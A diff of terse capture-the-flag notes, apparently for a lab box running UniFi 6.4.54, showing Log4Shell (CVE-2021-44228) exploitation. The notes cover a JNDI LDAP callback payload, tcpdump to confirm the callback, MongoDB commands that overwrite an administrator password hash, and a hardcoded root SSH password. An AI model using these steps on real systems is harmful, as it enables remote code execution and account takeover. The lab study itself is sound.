@@ -168,9 +168,19 @@ evil-winrm -i {IP_ADDRESS} -u administrator -p 'MEGACORP_4dm1n!!'
 
 # Unified
 
+-> has ports 22/tcp ssh 
+->6789/tcp   ibm-db2-admin?
+->8080/tcp tcpwrapped    
+->8443/tcp open  ssl/https-alt
 
-Yes — you’re right. Before you build the full exploit chain (LDAP server + HTTP server serving a malicious Java class), you want to confirm the target is actually vulnerable and will reach back out to you. So you send a simple payload like ${jndi:ldap://your_ip:389/o=tomcat} and run tcpdump -i tun0 port 389 (or similar) on your attack box. If you see the target hit your LDAP listener, you’ve confirmed:
+-> connect to the website by typing the 
+```css
+https://{IP_ADDRESS:8443
+```
 
+->unifi website 6.4.54, has an exploit, vulnerable to log4j rce attack CVE-2021-44228 (log4shell)
+
+-> we can use burp suite to try to make an ldap connection and see if its vulnerable by using tcpdump on port 
 The field is vulnerable to JNDI injection
 The target has network access back to you
 You’re using the right interface/IP
@@ -229,3 +239,33 @@ cat /etc/os-release
 
 
 ps aux 
+
+
+mongo has port 27117 
+
+-> log in to mongo then enumerate all the collections and databases
+
+```bash
+show dbs
+use <database>
+
+show collections
+db.<collections>.find() # we can find the x_shadow and update it
+
+db.<collections>.update({"name":"administrator"},{$set:{"x_shadow":"{HASHED_PASSWORD}"}})
+```
+
+-> use the updated credentials to log into the unifi website
+
+-> grab the ssh credentials in settings and ssh in
+
+```bash
+ssh {IP_ADDRESS} -l root
+
+# it will prompt you for the password
+# which is:
+-NotACrackablePassword4U2022-
+```
+
+
+-> get the flag!
